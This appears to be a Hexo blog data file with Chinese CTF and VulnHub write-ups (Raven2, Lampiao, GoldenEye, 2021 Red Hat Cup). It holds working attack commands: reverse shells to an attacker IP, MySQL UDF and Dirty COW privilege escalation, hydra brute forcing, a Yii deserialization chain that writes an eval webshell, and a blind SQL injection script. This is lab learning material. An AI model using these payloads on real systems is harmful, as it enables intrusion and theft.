{"meta":{"title":"Virtua1","subtitle":"你只有非常努力，才能看起来毫不费力","description":"","author":"Virtua1","url":"https://v1sun.github.io","root":"/"},"pages":[{"title":"分类","date":"2021-05-02T15:38:32.000Z","updated":"2021-05-02T15:39:15.813Z","comments":true,"path":"categories/index.html","permalink":"https://v1sun.github.io/categories/index.html","excerpt":"","text":""},{"title":"关于我","date":"2021-04-18T12:50:56.000Z","updated":"2021-05-02T16:04:54.564Z","comments":true,"path":"about/index.html","permalink":"https://v1sun.github.io/about/index.html","excerpt":"","text":"即将毕业的大四学生 CTFer Web入门选手 Misc签到选手 Pwn正在入门……"},{"title":"友情链接","date":"2021-05-02T15:31:31.000Z","updated":"2021-05-02T15:32:17.888Z","comments":true,"path":"link/index.html","permalink":"https://v1sun.github.io/link/index.html","excerpt":"","text":""},{"title":"tags","date":"2021-05-11T09:56:34.000Z","updated":"2021-05-11T09:57:02.552Z","comments":true,"path":"tags/index.html","permalink":"https://v1sun.github.io/tags/index.html","excerpt":"","text":""}],"posts":[{"title":"VulnHub靶机3-Raven2","slug":"VulnHub靶机3-Raven2","date":"2021-05-14T15:30:00.000Z","updated":"2021-05-14T15:30:48.833Z","comments":true,"path":"2021/05/14/VulnHub靶机3-Raven2/","link":"","permalink":"https://v1sun.github.io/2021/05/14/VulnHub%E9%9D%B6%E6%9C%BA3-Raven2/","excerpt":"","text":"VulnHub靶机3-Raven2信息收集Kali攻击机IP：192.168.245.128 主机发现1nmap -sP 192.168.245.0&#x2F;24 靶机IP：192.168.245.130 端口扫描1nmap -sS -sV -A -T4 -p- 192.168.245.130 开放22端口（SSH）、80端口（WEB)、111端口、38771端口 网站信息收集80的WEB服务： 敏感信息扫描： 1dirsearch -u http:&#x2F;&#x2F;192.168.245.130&#x2F; -e* 存在/.DS_Store 没有什么有用信息。 目录探测： 1dirb http:&#x2F;&#x2F;192.168.245.130&#x2F; &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt 存在vendor目录：可以目录遍历 发现flag1： 1flag1&#123;a2c1f66d2b8051bd3a5874b5b6e43e21&#125; 同时发现这是个PHPMailer 系统 版本：5.2.16 可以发现存在wordpress 框架 直接利用wpscan 扫描站点： 1wpscan --url http:&#x2F;&#x2F;192.168.245.130&#x2F;wordpress&#x2F; 可见版本：WordPress 4.8.17 漏洞利用首先尝试攻击wordpress，几个漏洞的利用都需要登陆后台，没有找到后台地址，这条路先放一下。 针对PHPMailer（5.2.16）测试： exploit-db发现存在可利用的漏洞：PHPMailer &lt; 5.2.20 - Remote Code Execution （CVE2016-10045、CVE2016-10033） 尝试MSF： 12345optionsset RHOSTS 192.168.245.130set TARGETURI &#x2F;contact.phpset WEB_ROOT &#x2F;var&#x2F;www&#x2F;htmlrun 访问后一直没有收到session 不知道什么原因 直接利用exploit-db的EXP或者Kali搜索： 1searchsploit PHPMailer 修改下poc： 开启监听： 1nc -lvvp 4444 1python 40974.py 之后访问contact.php： 1http:&#x2F;&#x2F;192.168.245.130&#x2F;contact.php 生成vvv.php： 1http:&#x2F;&#x2F;192.168.245.130&#x2F;vvv.php 收到shell： Get-Flag创建一个tty： 1python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; web目录的上层目录发现flag2： 1flag2&#123;6a8ed560f0b5358ecf844108048eb337&#125; 继续搜索flag，利用find命令： 1find &#x2F;var&#x2F; -name flag* flag3直接访问： 1http:&#x2F;&#x2F;192.168.245.130&#x2F;wordpress&#x2F;wp-content&#x2F;uploads&#x2F;2018&#x2F;11&#x2F;flag3.png 权限提升尝试内核提权失败按照渗透思路，猜测flag4需要提权进入/root，首先尝试内核提权： 查看下版本： 没有找到利用思路。 继续收集靶机信息进一步信息收集 看一下运行的程序： 1ps -aux 发现mysql是以root用户运行，进一步确认： 1ps -aux | grep mysql 同时可以获取到wordpress的配置信息： 1cat wp-config.php 找到数据库密码： 12rootR@v3nSecurity 对数据库进行信息收集： 收集到的信息： 1234mysql版本：5.5.60-0+deb8u1数据库名：wordpress用户密码：michael $P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0用户密码：steven $P$B6X3H3ykawf2oHuPsbjQiih5iJXqad. 因此尝试mysql udf提权 Mysql-UDF手动提权首先看一下是否满足写入条件： 1show global variables like &#39;secure%&#39; 当 secure_file_priv 的值为 NULL ，表示限制 mysqld 不允许导入|导出，此时无法提权当 secure_file_priv 的值为 /tmp/ ，表示限制 mysqld 的导入|导出只能发生在 /tmp/ 目录下，此时也无法提权当 secure_file_priv 的值没有具体值时，表示不对 mysqld 的导入|导出做限制，此时可提权 可见满足条件。 如果是 MySQL &gt;= 5.1 的版本，必须把 UDF 的动态链接库文件放置于 MySQL 安装目录下的 lib\\plugin 文件夹下文件夹下才能创建自定义函数。 查看插件目录： 1show variables like &#39;%plugin%&#39;; 查看能否远程登陆： 12use mysql;select user,host from user; 发现这里root用户不允许远程登陆，因此不能利用MSF提权。 手动提权： 找到利用的动态链接库： 1searchsploit udf copy到当前目录： 1cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;1518.c .&#x2F; 编译生成so文件： 123456gcc -g -shared -o vvv.so 1518.c -lcls-g 生成调试信息-shared 创建一个动态链接库，输入文件可以是源文件、汇编文件或者目标文件-o 生成的文件-lc -l 库 c库名 攻击机搭建http 服务，上传so文件： 1python3 -m http.server 8000 靶机下载文件： 12cd &#x2F;tmpwget http:&#x2F;&#x2F;192.168.245.128:8000&#x2F;vvv.so 接下来利用so文件提权： 进入数据库： 1use mysql; 创建数据表： 1create table evil(line blob); 插入文件： 1insert into evil values(load_file(&#39;&#x2F;tmp&#x2F;vvv.so&#39;)); 利用dumpfile导出，注意： outfile 多行导出，dumpfile一行导出 outfile会有特殊的转换，而dumpfile是原数据导出 1select * from evil into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;plugin&#x2F;vvv.so&#39;; 创建自定义函数do_system 类型是integer，别名（soname）文件名字： 1create function do_system returns integer soname &#39;vvv.so&#39;; 查看以下创建的函数： 1select * from mysql.func; 利用自定义函数改变find命令权限： 1select do_system(&#39;chmod u+s &#x2F;usr&#x2F;bin&#x2F;find&#39;); 利用find命令提权： 1234exit;touch vvfind vv -exec &quot;&#x2F;bin&#x2F;sh&quot; \\;whoami 可见成功提权到root，进入到root目录，读取到flag4 1flag4&#123;df2bc5e951d91581467bb9a2a8ff4425&#125; 思路总结Mysql-UDF提权： 原理：利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限。 自定义函数，是数据库功能的一种扩展。用户通过自定义函数可以实现在 MySQL 中无法方便实现的功能，其添加的新函数都可以在SQL语句中调用，就像调用本机函数 version() 等方便。 可远程的话直接利用MSF的mysql-udf提权模块： 或者sqlmap： 1sqlmap -d &quot;mysql:&#x2F;&#x2F;root:root@192.168.245.130:3306&#x2F;mysql&quot; --os-shell 否则需要手动提权。 利用条件： 12345mysql &lt; 5.0，导出路径随意。5.0 &lt;&#x3D; mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:&#x2F;windows&#x2F;system32&#x2F;)mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\\plugin文件夹下才能创建自定义函数。掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。拥有可以将udf.dll写入相应目录的权限 提权步骤： 查看mysql 权限 查看是否具有可写入的权限： 1show global variables like &#39;secure%&#39; 查看是否支持远程登陆： 12use mysql;select user,host from user; 准备动态链接库： 1searchsploit udf &#x2F;&#x2F;kali 12sqlmap根目录&#x2F;data&#x2F;udf&#x2F;mysql &#x2F;&#x2F;sqlmap&#x2F;&#x2F;需要解码：https:&#x2F;&#x2F;www.sqlsec.com&#x2F;2020&#x2F;11&#x2F;mysql.html#toc-heading-10 1MSF 根目录&#x2F;embedded&#x2F;framework&#x2F;data&#x2F;exploits&#x2F;mysql &#x2F;&#x2F;MSF 查看插件目录： 1show variables like &#39;%plugin%&#39;; 如果不存在的话可以在 webshell 中找到 MySQL 的安装目录然后手工创建 \\lib\\plugin 文件夹： 接下来就是按照以上步骤写入、导出、创建自定义函数并调用命令。","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://v1sun.github.io/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://v1sun.github.io/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"VulnHub","permalink":"https://v1sun.github.io/tags/VulnHub/"}]},{"title":"VulnHub靶机2-Lampiao","slug":"VulnHub靶机2-Lampiao","date":"2021-05-14T10:00:00.000Z","updated":"2021-05-14T10:01:14.551Z","comments":true,"path":"2021/05/14/VulnHub靶机2-Lampiao/","link":"","permalink":"https://v1sun.github.io/2021/05/14/VulnHub%E9%9D%B6%E6%9C%BA2-Lampiao/","excerpt":"","text":"VulnHub靶机2-Lampiao信息收集攻击机IP： 1192.168.245.128 主机发现12nmap -sP 192.168.245.0&#x2F;24主机IP:192.168.245.129 端口扫描1nmap -sS -sV -A -T4 -p- 192.168.245.129 发现开放了22、80、1898端口，访问80、1898是web服务 利用80、1898当做入口，进行网站信息收集 网站信息收集 利用dirsearch扫描目录： dirsearch -u &quot;http://192.168.245.129/&quot; -e* 没有什么信息，是一个静态页面 利用dirsearch扫描目录： dirsearch -u &quot;http://192.168.245.129:1898/&quot; -e* robots.txt 同时发现网站框架为Drupal 版本为7.54 漏洞利用网上找一波Drupal 7版本的漏洞 参考：https://hackingprofessional.github.io/HTB/How-to-hack-a-website-that-uses-Drupal/ 1searchsploit drupal 根据版本信息，利用7.x Module Services - Remote Code Execution 1cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;php&#x2F;webapps&#x2F;41564.php .&#x2F; 发现exploit会用到/rest_endpoint 扫到的目录并不存在，访问404，利用dirb 扫描下： 1dirb http://192.168.245.129:1898/ /usr/share/dirb/wordlists/common.txt -w 没有找到利用目录，换个exploit，exploit-db 发现2018-7600，直接上MSF 123msfconsolesearch drupaluse 4 利用： 1234optionsset rhosts 192.168.245.129set rport 1898run 可见攻击成功，拿到www-data的权限。 权限提升拿到低权限的shell，接下来提权，采用最常用的内核漏洞提权。 1python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; 创建一个tty： 查看Linux版本和内核版本： 1searchsploit Ubuntu 14.04.5 利用第二个提权： 12cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux_x86&#x2F;local&#x2F;42276.c .&#x2F;python3 -m http.server 8000 复制到本地，然后python创建一个http服务用于下载exploit 1234cd &#x2F;tmpwget http:&#x2F;&#x2F;192.168.245.128:8000&#x2F;42276.cgcc -v &#x2F;&#x2F;存在gcc 否则用ccgcc 42276.c -o .&#x2F;exp 运行： 1.&#x2F;exp 提权失败。再尝试利用脏牛提权： 1searchsploit dirty 利用40847.cpp： 123cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;40847.cpp .&#x2F;lspython3 -m http.server 8000 1234wget http:&#x2F;&#x2F;192.168.245.128:8000&#x2F;40847.cpplsg++ -Wall -pedantic -O2 -std&#x3D;c++11 -pthread -o 40847 40847.cpp -lutil.&#x2F;40847 得到root 密码，想到开放了22端口。ssh登录： 1ssh root@192.168.245.129 Get-Flag 其他思路大余师傅@的一个思路： 可以进入： audio.m4a 是一段语音：user tiago 用户名为tiago qrc.png 是一个二维码：Try harder! muahuahua 接下来暴力破解SSH，用到两个工具cewl和hydra cewl：通过爬行网站获取关键信息创建一个密码字典 1cewl http:&#x2F;&#x2F;192.168.245.129:1898&#x2F;?q&#x3D;node&#x2F;1 -w vvv.txt 1hydra -l tiago -P vvv.txt 192.168.245.129 ssh 得到用户名、密码： 12tiago Virgulino 登录SSH： 1ssh tiago@192.168.245.129 普通用户，需要提权，思路同上。 思路总结渗透的本质是信息收集！！！！！！！ dirbdirb 工具：一个类似windows下御剑的目录扫描工具 常用参数： -a 设置ua -c 设置cookie带cookie扫描 -N 忽略某些响应码 -o 输出结果 -p 使用代理 -X 在每个测试目录上附加后缀 -z 设置毫秒延迟 1234dirb url dic.txt -X vvv &#x2F;&#x2F;利用本地字典&amp;设置附加后缀dirb url dic.txt -a &quot;ua&quot; -c &quot;cookie&quot; &#x2F;&#x2F;设置ua&amp;cookiedirb url dic.txt -p ip:port -o result.txt &#x2F;&#x2F;设置代理&amp;输出结果dirb url dic.txt -z 1000 &#x2F;&#x2F;设置延迟单位毫秒(1000&#x3D;1秒) cewlcewl 通过爬行网站获取关键信息创建一个密码字典 1234567891011121314151617181920cewl --debug &#x2F;&#x2F;调试模式cewl url &#x2F;&#x2F;爬取网站，输出字典cewl url -w dict.txt &#x2F;&#x2F;字典写入dict.txtcewl url -m 9 &#x2F;&#x2F;设置最小长度为9的字典cewl url -d 3 &#x2F;&#x2F;设置爬取深度cewl url -c &#x2F;&#x2F;统计词的出现次数cewl url -n -e &#x2F;&#x2F;-e启用Email参数，-n隐藏工具在爬取网站过程中生成的密码字典cewl -v &#x2F;&#x2F;-v进入verbose模式，导出目标网站的详细数据cewl --with-numbers &#x2F;&#x2F;生成包含数字字符的字典绕过认证：–auth_type:Digest or basic.–auth_user:Authentication username.–auth_pass:Authentication password.cewl url --auth_type Digest --auth_user admin--auth_pass password -vcewl url --auth_type basic --auth_user admin--auth_pass password -v设置代理：cewl --proxy_host IP --proxy_port PORT -w dict.txt url如果目标网站设置了代理服务器的话，Cewl将无法使用默认命令来生成字典，需要使用–proxy option选项来启用代理URL功能。","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://v1sun.github.io/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://v1sun.github.io/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"VulnHub","permalink":"https://v1sun.github.io/tags/VulnHub/"}]},{"title":"VulnHub靶机1-GoldenEye","slug":"VulnHub靶机1-GoldenEye","date":"2021-05-14T04:00:00.000Z","updated":"2021-05-14T10:02:02.991Z","comments":true,"path":"2021/05/14/VulnHub靶机1-GoldenEye/","link":"","permalink":"https://v1sun.github.io/2021/05/14/VulnHub%E9%9D%B6%E6%9C%BA1-GoldenEye/","excerpt":"","text":"VulnHub靶机1-GoldenEye信息收集攻击机kali（nat） Ip ：192.168.130.129 靶机GoldenEye （nat） 主机发现nmap扫描 网段： 1nmap -sP 192.168.130.0&#x2F;24 确定靶机地址：192.168.130.130 端口扫描接下来nmap全端口扫描，收集开启的端口服务： 1nmap -sS -sV -A -T4 -p- 192.168.130.130 -sS 隐匿扫描 -sV获取版本信息 -A主动扫描获取详细信息 -T5T5速度扫描 -p-全端口扫描 开启了80端口、25端口、55006端口、55007端口 网站信息收集80端口web服务信息收集 目录扫描： 访问网站： 给了提示/sev-home/： 登录需要账户密码，查看源代码发现有个JS文件 发现用户名和加密的密码，直接利用google代码优化就可以解密： 12用户名：Boris、Natalya密码：InvincibleHack3r 尝试登录多次不行，最后发现用户名首字母需要小写： 12用户名：boris密码：InvincibleHack3r 查看源代码收集信息： 翻译： 可见开启了pop3服务，并且位于非默认端口。 POP3是Post Office Protocol 3的简称，即邮局协议的第3个版本,它规定怎样将个人计算机连接到Internet的邮件服务器和下载电子邮件的电子协议。它是因特网电子邮件的第一个离线协议标准,POP3允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。 两个合格的GoldenEye网络运营商主管，也就是我们前期收集到的两个用户。 前期端口扫描发现运行的55006端口、55007端口尝试访问： 发现55007端口运行着pop3服务 接下来思路就是利用 Hydra爆破pop3，用户名为我们收集到的两个用户： 1hydra -L user.txt -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt -s 55007 192.168.130.130 pop3 12boris secret1!natalya bird POP3命令： 1234567891011POP commands: USER uid Log in as &quot;uid&quot; PASS password Substitue &quot;password&quot; for your actual password STAT List number of messages, total mailbox size LIST List messages and sizes RETR n Show message n DELE n Mark message n for deletion RSET Undo any changes QUIT Logout (expunges messages if no RSET) TOP msg n Show first n lines of message number msg CAPA Get capabilities 登陆： 12nc 192.168.130.130 55007telnet 192.168.130.130 55007 可以成功登陆并查看邮件信息。 依次查看邮件信息： 存在附件但是无法查看，登陆natalya用户，并浏览邮件： 用户信息： 123用户名：xenia密码：RCP90rulez!网址：severnaya-station.com&#x2F;gnocertdir 添加域名到本地/etc/hosts： 访问网址，发现是Moodle cms： 可以利用获取到的账户密码登陆： 浏览信息，发现新的账户： 继续爆破doak账户： 1hydra -l doak -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;fasttrack.txt -s 55007 192.168.130.130 pop3 爆破成功 12用户名：doak密码：goat 登录下pop3查看下邮件信息： 又得到一个账户密码： 12用户名：dr_doak密码：4England! 登录网站。 发现一个s3cret.txt文件： 打开文件： 打开图片： 下载图片查看图片信息： 得到密码：xWinter1995x! 登陆管理员账户：admin xWinter1995x! 浏览信息得到 Moodle version 2.2.3 其实前边得到的信息可得版本信息 2.2.3。 现在已知信息： 123456789101112131415161718IP:192.168.130.130域名：http:&#x2F;&#x2F;severnaya-station.com&#x2F;gnocertdir&#x2F;pop3服务：55007boris secret1!natalya birdMoodle cms 2.2.3用户信息：用户名：xenia密码：RCP90rulez!用户名：dr_doak密码：4England!管理员账户密码：用户名：admin 密码：xWinter1995x! 服务器信息：ubuntu apache 漏洞利用搜集Moodle cms漏洞 getshell 发现存在Moodle Spellcheck 远程命令执行漏洞（CVE-2013-3630） 在POST的时候需要将拼写检查检查google spell换成PSpellSHell，因为目标主机上不存在GCC编译，只能有CC编译，所以需要把Google Spell改成PSpellShell 修改PSpellSHell的位置在”Settings”–&gt;”Site administration”–&gt;”Plugins”–&gt;”Text editors”–&gt;”TinyMCE HTML editor”： 命令执行的位置在”Settings”–&gt;”Site administration”–&gt;”Server”–&gt;”System paths”–&gt;”Path to aspell”： MSF搜索到漏洞利用方式： 反弹shell先利用后台手动反弹shell： 在命令执行的位置”Settings”–&gt;”Site administration”–&gt;”Server”–&gt;”System paths”–&gt;”Path to aspell” 执行反弹shell命令： 利用bash反弹： 12345监听：nc -lvvp 9999反弹：bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.130.129&#x2F;9999 0&gt;&amp;1 试了好几次，bash反弹不了。 python反弹shell： 12345监听：nc -lvvp 9999反弹：python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.130.129&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;sh&quot;,&quot;-i&quot;]);&#39; 然后新建博客，并且点击Toggle Spellchecker: 成功反弹到shell： MSF攻击模块 12345678search moodleuse xploit&#x2F;multi&#x2F;http&#x2F;moodle_cmd_execset username adminset password xWinter1995x!set RHOST severnaya-station.comset targeturi &#x2F;gnocertdirset payload cmd&#x2F;unix&#x2F;reverserun 尝试多次都是失败，网上查找原因是MSF版本太高。 权限提升利用python反弹的shell信息收集： 内核版本：ubuntu 3.13.0 创建一个tty： 1python -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot; 搜索EXP1searchsploit Linux ubuntu 3.13.0 利用37292.c提权 搭建HTTP服务在攻击机搭建http服务 上传exp脚本 12cp &#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;exploits&#x2F;linux&#x2F;local&#x2F;37292.c .&#x2F;python3 -m http.server 8000 下载EXPshell切换到/tmp目录（777）从http服务下载exp 12345$ cd &#x2F;tmp $ wget http:&#x2F;&#x2F;192.168.130.129:8000&#x2F;37292.c$ ls$ gcc -v &#x2F;&#x2F;报错说明没有gcc编译器$ cc -v &#x2F;&#x2F;存在cc编译器 没有gcc 所以需要修改exp的gcc为cc 然后重新下载 编译。 编译1cc 37292.c -o exp 报错但是不影响 运行1.&#x2F;exp 可见已经是root权限。 Get-flag 解密MD5 访问： 思路总结渗透测试的本质是信息收集！！！！！！！！！！ pop3服务 POP3是Post Office Protocol 3的简称，即邮局协议的第3个版本,它规定怎样将个人计算机连接到Internet的邮件服务器和下载电子邮件的电子协议。它是因特网电子邮件的第一个离线协议标准,POP3允许用户从服务器上把邮件存储到本地主机（即自己的计算机）上,同时删除保存在邮件服务器上的邮件，而POP3服务器则是遵循POP3协议的接收邮件服务器，用来接收电子邮件的。 默认端口：110 利用hydra爆破密码 12hydra -L username.txt -P password.txt -s 端口 IP pop3 &#x2F;&#x2F;-s 服务运行于非默认端口指定端口hydra -l USERNAME -p PSSWORD -s 端口 IP pop3 登录pop3 查看信息 12nc IP PORTtelnet IP PORT 123456789101112USER username 认证用户名PASS password 认证密码认证，认证通过则状态转换 APOP name,digest 认可一种安全传输口令的办法，执行成功导致状态转换，请参见 RFC 1321 。STAT 处理请求 server 回送邮箱统计资料，如邮件数、 邮件总字节数UIDL n 处理 server 返回用于该指定邮件的唯一标识， 如果没有指定，返回所有的。LIST n 处理 server 返回指定邮件的大小等 RETR n 处理 server 返回邮件的全部文本 DELE n 处理 server 标记删除，QUIT 命令执行时才真正删除RSET 处理撤消所有的 DELE 命令 TOP n,m 处理 返回 n 号邮件的前 m 行内容，m 必须是自然数 NOOP 处理 server 返回一个肯定的响应 QUIT 希望结束会话。如果 server 处于&quot;处理&quot; 状态，则现在进入&quot;更新&quot;状态，删除那些标记成删除的邮件。如果 server 处于&quot;认可&quot;状态，则结束会话时 server 不进入&quot;更新&quot;状态 。 Moodle cms已知cms 版本可以直接去exploit-db 搜索漏洞 Moodle Spellcheck 远程命令执行漏洞（CVE-2013-3630）Moodle2.2.3 拼写检查引擎远程执行代码","categories":[{"name":"靶机渗透","slug":"靶机渗透","permalink":"https://v1sun.github.io/categories/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://v1sun.github.io/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"VulnHub","slug":"VulnHub","permalink":"https://v1sun.github.io/tags/VulnHub/"}]},{"title":"2021红帽杯WP","slug":"2021红帽杯WP","date":"2021-05-11T04:00:00.000Z","updated":"2021-05-11T09:49:00.114Z","comments":true,"path":"2021/05/11/2021红帽杯WP/","link":"","permalink":"https://v1sun.github.io/2021/05/11/2021%E7%BA%A2%E5%B8%BD%E6%9D%AFWP/","excerpt":"","text":"[MISC]签到http://www.longpelaexpertise.com.au/toolsCode.php [WEB]find itrobots.txt .1ndexx.php.swp 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;?php $link &#x3D; mysql_connect(&#39;localhost&#39;, &#39;root&#39;); ?&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;Hello worldd!&lt;&#x2F;title&gt; &lt;style&gt; body &#123; background-color: white; text-align: center; padding: 50px; font-family: &quot;Open Sans&quot;,&quot;Helvetica Neue&quot;,Helvetica,Arial,sans-serif; &#125; #logo &#123; margin-bottom: 40px; &#125; &lt;yle&gt;&lt;&#x2F;head&gt;&lt;body&gt; &lt; img id&#x3D;&quot;logo&quot; src&#x3D;&quot;logo.png&quot; &#x2F;&gt; &lt;h1&gt;&lt;?php echo &quot;Hello My freind!&quot;; ?&gt;&lt;&#x2F;h1&gt; &lt;?php if($link) &#123; ?&gt; &lt;h2&gt;I Can&#39;t view my php files?!&lt;&#x2F;h2&gt; &lt;?php &#125; else &#123; ?&gt; &lt;h2&gt;MySQL Server version: &lt;?php echo mysql_get_server_info(); ?&gt;&lt;&#x2F;h2&gt; &lt;?php &#125; ?&gt;&lt;&#x2F;body&gt;&lt;ml&gt;&lt;?php#Really easy...$file&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;) or die(&quot;Unable 2 open!&quot;);$I_know_you_wanna_but_i_will_not_give_you_hhh &#x3D; fread($file,filesize(&quot;flag.php&quot;));$hack&#x3D;fopen(&quot;hack.php&quot;,&quot;w&quot;) or die(&quot;Unable 2 open&quot;);$a&#x3D;$_GET[&#39;code&#39;];if(preg_match(&#39;&#x2F;system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\\~|\\^|\\&#96;|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump&#x2F;&#39;,$a))&#123; die(&quot;you die&quot;);&#125;if(strlen($a)&gt;33)&#123; die(&quot;nonono.&quot;);&#125;fwrite($hack,$a);fwrite($hack,$I_know_you_wanna_but_i_will_not_give_you_hhh);fclose($file);fclose($hack);?&gt; 直接写入phpinfo： 1http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;1ndexx.php?code&#x3D;&lt;?php phpinfo();?&gt; 然后访问hack.php： 1http:&#x2F;&#x2F;eci-2zeab1jn4vnk02hulykm.cloudeci1.ichunqiu.com&#x2F;hack.php PHPINFO页面 找到flag [WEB]framework存在WWW.ZIP源码泄露 https://www.anquanke.com/post/id/217930 三条链子都可以用。看下phpinfo： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354&lt;?phpnamespace yii\\rest&#123; class CreateAction&#123; public $checkAccess; public $id; public function __construct()&#123; $this-&gt;checkAccess = &#x27;assert&#x27;; $this-&gt;id = &quot;phpinfo();&quot;; &#125; &#125;&#125;namespace Faker&#123; use yii\\rest\\CreateAction; class Generator&#123; protected $formatters; public function __construct()&#123; // 这里需要改为isRunning $this-&gt;formatters[&#x27;render&#x27;] = [new CreateAction(), &#x27;run&#x27;]; &#125; &#125;&#125;namespace phpDocumentor\\Reflection\\DocBlock\\Tags&#123; use Faker\\Generator; class See&#123; protected $description; public function __construct() &#123; $this-&gt;description = new Generator(); &#125; &#125;&#125;namespace&#123; use phpDocumentor\\Reflection\\DocBlock\\Tags\\See; class Swift_KeyCache_DiskKeyCache&#123; private $keys = []; private $path; public function __construct() &#123; $this-&gt;path = new See; $this-&gt;keys = array( &quot;axin&quot;=&gt;array(&quot;is&quot;=&gt;&quot;handsome&quot;) ); &#125; &#125; // 生成poc echo base64_encode(serialize(new Swift_KeyCache_DiskKeyCache()));&#125; 1http:&#x2F;&#x2F;eci-2ze8j3xqhbs4r48k0oky.cloudeci1.ichunqiu.com&#x2F;index.php?r&#x3D;site%2Fabout&amp;message&#x3D;TzoyNzoiU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlIjoyOntzOjMzOiIAU3dpZnRfS2V5Q2FjaGVfRGlza0tleUNhY2hlAGtleXMiO2E6MTp7czo0OiJheGluIjthOjE6e3M6MjoiaXMiO3M6ODoiaGFuZHNvbWUiO319czozMzoiAFN3aWZ0X0tleUNhY2hlX0Rpc2tLZXlDYWNoZQBwYXRoIjtPOjQyOiJwaHBEb2N1bWVudG9yXFJlZmxlY3Rpb25cRG9jQmxvY2tcVGFnc1xTZWUiOjE6e3M6MTQ6IgAqAGRlc2NyaXB0aW9uIjtPOjE1OiJGYWtlclxHZW5lcmF0b3IiOjE6e3M6MTM6IgAqAGZvcm1hdHRlcnMiO2E6MTp7czo2OiJyZW5kZXIiO2E6Mjp7aTowO086MjE6InlpaVxyZXN0XENyZWF0ZUFjdGlvbiI6Mjp7czoxMToiY2hlY2tBY2Nlc3MiO3M6NjoiYXNzZXJ0IjtzOjI6ImlkIjtzOjEwOiJwaHBpbmZvKCk7Ijt9aToxO3M6MzoicnVuIjt9fX19fQ&#x3D;&#x3D; 可以看phpinfo 关键是绕过: 1pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl,mail,putenv,error_log,error_reporting,unset,unlink,return 参考：https://www.anquanke.com/post/id/170681 写shell绕过： 12$this-&gt;checkAccess = &#x27;assert&#x27;;$this-&gt;id = &#x27;file_put_contents(&quot;v.php&quot;, base64_decode(&quot;PD9waHAgZXZhbCgkX1BPU1Rbdl0pOz8+&quot;));&#x27;;&#125; 蚁剑连接：绕过disable functions [WEB]WebsiteManger登陆页面，图片存在注入，注入得到用户名、密码 1234567891011121314151617import requestsreq = requests.session()string = &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;;res = &#x27;&#x27;for i in range(21,50): for j in string: url = &quot;http://eci-2zeebn8ci69dx3qyic2l.cloudeci1.ichunqiu.com/image.php?id=&quot; payload = &quot;if(ascii(substr((select/**/group_concat(password)from(users)),%d,1))=(%s),1,0)&quot;%(i,ord(j)) r = req.get(url+payload) if &quot;JFIF&quot; in r.text: res += j print(res) break#admin#05b0176855ad7f3e7d9ac 登陆后 file协议读取flag即可 1file:&#x2F;&#x2F;&#x2F;flag [WEB]ezlight0day– gml yyds [Crypto]primegamehttp://www.secmem.org/blog/2020/09/20/poka-science-war-hacking/ 